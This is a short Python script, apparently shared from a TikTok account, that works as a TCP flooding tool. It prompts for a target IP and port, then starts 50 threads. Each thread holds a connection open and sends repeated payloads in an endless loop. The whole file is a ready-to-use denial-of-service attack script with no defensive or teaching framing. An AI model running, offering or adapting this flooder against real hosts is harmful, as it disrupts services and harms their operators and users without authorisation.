import socket
import threading
import os

TARGET_IP = input("TARGET IP: ")
TARGET_PORT = int(input("OPEN PORT: "))
os.system("clear")
print("MADE BY apexvr_ ON TIKTOK")
NUM_THREADS = 50

def send_packets():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET_IP, TARGET_PORT))
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        count = 0
        while True:
            s.sendall(b"Test packet\n" * 100)
            count += 100
            if count % 100000 == 0:
                print(f"{threading.current_thread().name}: {count} packets sent")
    except Exception as e:
        print(f"{threading.current_thread().name} Error: {e}")

threads = []

for i in range(NUM_THREADS):
    t = threading.Thread(target=send_packets, name=f"Wątek-{i+1}")
    t.start()
    threads.append(t)

try:
    for t in threads:
        t.join()
except KeyboardInterrupt:
    print("\nStopped manually (Ctrl+C)")
